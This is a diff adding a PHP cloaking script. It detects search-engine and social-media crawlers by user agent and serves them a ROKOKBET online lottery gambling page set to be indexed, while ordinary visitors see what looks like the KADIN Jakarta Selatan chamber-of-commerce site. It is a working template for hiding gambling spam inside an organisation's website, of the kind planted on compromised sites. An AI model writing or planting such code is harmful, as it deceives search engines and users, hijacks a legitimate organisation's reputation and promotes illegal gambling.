@@ -1,0 +1,70 @@
+<?php
+// ====================== CLOAKING - User KADIN, Bot Rokokbet ======================
+
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+// Deteksi Bot (lebih lengkap)
+$bot_keywords = [
+    'googlebot', 'googlebot-image', 'bingbot', 'slurp', 'yandex', 'baiduspider',
+    'duckduckbot', 'msnbot', 'teoma', 'seznam', 'bot', 'crawler', 'spider',
+    'facebookexternalhit', 'twitterbot', 'rogerbot', 'linkedinbot', 'mediapartners'
+];
+
+$is_bot = false;
+foreach ($bot_keywords as $bot) {
+    if (strpos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+// ================== BOT → TAMPILKAN ROKOKBET ==================
+if ($is_bot) {
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROKOKBET ~ HOME BASE AGEN TOGEL ONLINE 4D JAGO NYA SITUS TOTO TOGEL TERPERCAYA</title>
+    <meta name="description" content="ROKOKBET hadir sebagai home base utama agen togel online dengan julukan jagonya situs toto togel terpercaya 2026...">
+    <meta name="robots" content="index, follow">
+    <!-- Tambahkan semua meta, CSS, JS rokokbet di sini -->
+</head>
+<body>
+    <!-- ================== ISI KONTEN ROKOKBET LENGKAP ================== -->
+    <?php
+    // Paste SELURUH HTML rokokbet di sini (dari file pasted-text.txt yang bagian rokokbet)
+    ?>
+    <!-- Contoh placeholder -->
+    <h1>ROKOKBET - Situs Togel Online Terpercaya</h1>
+    <p>Selamat datang di ROKOKBET...</p>
+    
+</body>
+</html>
+<?php
+    exit; // Penting!
+}
+
+// ================== USER BIASA → TAMPILKAN KADIN ==================
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KADIN PC JAKARTA SELATAN - Kamar Dagang dan Industri Indonesia</title>
+    <meta name="description" content="Kamar Dagang dan Industri Indonesia Cabang Jakarta Selatan">
+    <meta name="robots" content="index, follow">
+    <!-- CSS dan meta KADIN -->
+</head>
+<body>
+    <!-- ================== ISI KONTEN KADIN LENGKAP ================== -->
+    <?php
+    // Paste SELURUH HTML KADIN di sini
+    ?>
+    <!-- Contoh -->
+    <h1>Selamat Datang di KADIN PC Jakarta Selatan</h1>
+    
+</body>
+</html>
